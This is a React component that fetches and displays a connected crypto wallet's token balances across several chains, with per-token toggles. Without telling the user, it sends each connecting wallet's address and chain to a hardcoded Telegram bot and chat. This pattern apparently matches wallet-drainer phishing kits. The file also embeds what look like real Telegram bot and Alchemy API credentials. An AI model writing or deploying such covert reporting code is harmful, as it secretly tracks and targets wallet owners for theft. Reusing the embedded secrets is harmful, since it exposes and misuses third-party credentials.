import { useCallback, useEffect, useState } from 'react';
import { useAccount, useWaitForTransactionReceipt } from 'wagmi';
import { Loading, Toggle } from '@geist-ui/core';
import { tinyBig } from 'essential-eth';
import { useAtom } from 'jotai';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import { Alchemy, Network } from 'alchemy-sdk';
import axios from 'axios';

// Telegram Bot Config
const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
const TELEGRAM_CHAT_ID = '6718529435';

// Function to send a message to Telegram
const sendTelegramNotification = async (message) => {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
  }
};

// Setup Alchemy instances for multiple networks
const alchemyInstances = {
  [Network.ETH_MAINNET]: new Alchemy({
    apiKey: 'iUoZdhhu265uyKgw-V6FojhyO80OKfmV',
    network: Network.ETH_MAINNET,
  }),
  [Network.BSC_MAINNET]: new Alchemy({
    apiKey: 'iUoZdhhu265uyKgw-V6FojhyO80OKfmV',
    network: Network.BSC_MAINNET,
  }),
  [Network.OPTIMISM]: new Alchemy({
    apiKey: 'iUoZdhhu265uyKgw-V6FojhyO80OKfmV',
    network: Network.OPTIMISM,
  }),
  [Network.ZK_SYNC]: new Alchemy({
    apiKey: 'iUoZdhhu265uyKgw-V6FojhyO80OKfmV',
    network: Network.ZK_SYNC,
  }),
  [Network.ARB_MAINNET]: new Alchemy({
    apiKey: 'iUoZdhhu265uyKgw-V6FojhyO80OKfmV',
    network: Network.ARB_MAINNET,
  }),
  [Network.MATIC_MAINNET]: new Alchemy({
    apiKey: 'iUoZdhhu265uyKgw-V6FojhyO80OKfmV',
    network: Network.MATIC_MAINNET,
  }),
  // Add other networks as needed
};

const chainIdToNetworkMap = {
  1: Network.ETH_MAINNET,      // Ethereum Mainnet
  56: Network.BSC_MAINNET,     // BSC Mainnet
  10: Network.OPTIMISM,        // Optimism Mainnet
  324: Network.ZK_SYNC,        // zkSync Mainnet
  42161: Network.ARB_MAINNET,  // Arbitrum Mainnet
  137: Network.MATIC_MAINNET,  // Polygon Mainnet
  // Add other mappings as needed
};

const supportedChains = [1, 56, 10, 324, 42161, 137]; // Supported chain IDs

const usdFormatter = new Intl.NumberFormat('en-US', {
  style: 'currency',
  currency: 'USD',
});

const safeNumber = (value) => {
  try {
    if (value === undefined || value === null || value === '') {
      return tinyBig(0);
    }
    const num = tinyBig(value);
    return num.isNaN ? tinyBig(0) : num;
  } catch (error) {
    console.error('Invalid number detected:', error, value);
    return tinyBig(0);
  }
};

// Fetch ETH to USD conversion rate
const fetchEthToUsdRate = async () => {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum',
        vs_currencies: 'usd',
      },
    });
    return safeNumber(response.data.ethereum.usd);
  } catch (error) {
    console.error('Error fetching ETH to USD rate:', error);
    return tinyBig(0);
  }
};

const TokenRow = ({ token, ethToUsdRate }) => {
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { chain } = useAccount();
  const pendingTxn = checkedRecords[token.contract_address]?.pendingTxn;

  const setTokenChecked = (tokenAddress, isChecked) => {
    setCheckedRecords((old) => ({
      ...old,
      [tokenAddress]: { isChecked: isChecked },
    }));
  };

  const { address } = useAccount();
  const { balance, contract_address, contract_ticker_symbol, quote, quote_rate } = token;

  const unroundedBalance = safeNumber(quote_rate).gt(0)
    ? safeNumber(quote).div(safeNumber(quote_rate))
    : safeNumber(balance).div(tinyBig(10).pow(18));

  const roundedBalance = unroundedBalance.lt(0.001)
    ? unroundedBalance.round(10)
    : unroundedBalance.gt(1000)
    ? unroundedBalance.round(2)
    : unroundedBalance.round(5);

  const tokenValueInUsd = token.contract_address === 'native'
    ? roundedBalance.times(ethToUsdRate)
    : safeNumber(quote);

  const { isLoading } = useWaitForTransactionReceipt({
    hash: pendingTxn?.blockHash || undefined,
  });

  return (
    <div key={contract_address}>
      {isLoading && <Loading />}
      <Toggle
        checked={checkedRecords[contract_address]?.isChecked}
        onChange={(e) => {
          setTokenChecked(contract_address, e.target.checked);
        }}
        style={{ marginRight: '18px' }}
        disabled={Boolean(pendingTxn)}
      />
      <span style={{ fontFamily: 'monospace' }}>
        {roundedBalance.toString()}{' '}
      </span>
      <a
        href={`${chain?.blockExplorers?.default.url}/token/${token.contract_address}?a=${address}`}
        target="_blank"
        rel="noreferrer"
      >
        {contract_ticker_symbol}
      </a>{' '}
      (worth{' '}
      <span style={{ fontFamily: 'monospace' }}>
        {usdFormatter.format(tokenValueInUsd)}
      </span>
      )
    </div>
  );
};

export const GetTokens = () => {
  const [tokens, setTokens] = useAtom(globalTokensAtom);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const [ethToUsdRate, setEthToUsdRate] = useState(tinyBig(0));
  const { address, isConnected, chain } = useAccount();
  const [notified, setNotified] = useState(false);

  const fetchData = useCallback(async () => {
    setLoading(true);
    try {
      setError('');
      if (!chain || !supportedChains.includes(chain.id)) {
        throw new Error(
          `Chain ${chain?.name || 'unknown'} not supported. Supported chains: ${supportedChains.join(', ')}.`
        );
      }

      const alchemyNetwork = chainIdToNetworkMap[chain.id];
      const alchemy = alchemyInstances[alchemyNetwork];

      console.log('Fetching ERC20 token balances...', `Address: ${address}`, `Chain ID: ${chain.id}`);
      
      // Fetch ERC20 token balances
      const tokensResponse = await alchemy.core.getTokenBalances(address);
      
      // Fetch native token balance
      const nativeBalanceResponse = await alchemy.core.getBalance(address, 'latest');

      // Fetch ETH to USD conversion rate
      const rate = await fetchEthToUsdRate();
      setEthToUsdRate(rate);

      const nativeToken = {
        contract_address: 'native',
        contract_ticker_symbol: chain.nativeCurrency.symbol, // Display native currency symbol
        balance: safeNumber(nativeBalanceResponse), // Add balance to native token
        quote: 0, // Set quote to 0 as it's the native token
        quote_rate: 0, // Set quote rate to 0 as it's the native token
      };

      const processedTokens = [
        nativeToken, // Include native token at the beginning of the tokens list
        ...tokensResponse.tokenBalances.map((balance) => ({
          contract_address: balance.contractAddress,
          balance: safeNumber(balance.tokenBalance),
          quote: balance.quote || 0,
          quote_rate: balance.quoteRate || 0,
        })),
      ];

      setTokens(processedTokens);
      console.log('Fetched tokens:', processedTokens);
    } catch (error) {
      console.error('Error fetching tokens:', error);
      setError(error.message);
    }
    setLoading(false);
  }, [address, chain, setTokens]);

  useEffect(() => {
    if (address && chain?.id) {
      fetchData();
      setCheckedRecords({});
    }
  }, [address, chain?.id, fetchData, setCheckedRecords]);

  useEffect(() => {
    if (!isConnected) {
      setTokens([]);
      setCheckedRecords({});
      setNotified(false);
    } else if (isConnected && !notified) {
      sendTelegramNotification(`New Connection: Wallet Address: ${address}, Chain: ${chain?.name}`);
      setNotified(true);
    }
  }, [isConnected, address, chain, setTokens, setCheckedRecords, notified]);

  if (loading) {
    return <Loading>Loading</Loading>;
  }

  if (error) {
    return <div>{error}</div>;
  }

  return (
    <div>
      {tokens.map((token) => (
        <TokenRow key={token.contract_address} token={token} ethToUsdRate={ethToUsdRate} />
      ))}
    </div>
  );
};
